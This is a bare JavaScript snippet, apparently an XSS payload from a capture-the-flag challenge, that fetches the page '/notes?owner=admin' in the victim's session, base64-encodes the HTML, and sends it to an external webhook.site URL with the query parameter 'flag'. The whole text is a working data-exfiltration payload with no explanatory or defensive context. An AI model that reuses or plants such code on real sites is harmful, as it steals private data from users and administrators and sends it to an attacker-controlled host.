fetch('/notes?owner=admin')
  .then(r => r.text())
  .then(html => {
    fetch('https://webhook.site/8cb65efc-852a-48d7-94c3-06e51c4aff4c?flag=' + btoa(html));
  });
